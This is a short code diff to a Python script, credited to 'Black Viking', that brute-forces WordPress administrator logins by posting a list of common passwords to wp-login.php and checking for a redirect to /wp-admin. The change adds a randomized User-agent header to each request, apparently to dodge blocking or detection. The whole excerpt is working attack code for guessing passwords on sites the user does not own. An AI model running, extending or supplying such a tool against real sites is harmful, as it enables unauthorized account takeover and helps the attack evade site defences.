@@ -17,6 +17,7 @@ __author__ = "Black Viking"
 __date__   = "16.04.2017"
 
 import sys
+import ragent
 import requests
 
 found     = []
@@ -26,12 +27,13 @@ passwords = ["admin", "pass", "password", "admin123", "qwerty", "123", "12345678
 def brute(site, username="admin", control=False):
 	''' Try login to site with username:password '''
 
+	header = {'User-agent': ragent.ua()}
 	site = "http://"+site.split("/")[2]+"/wp-login.php"
 	
 	for pwd in passwords:
 		try:
 			payload = {"log": username, "pwd": pwd}
-			req = requests.post(site, data=payload, timeout=5)
+			req = requests.post(site, data=payload, headers=header, timeout=5)
 			
 			if '/wp-admin' in req.url:
 				if control != False:
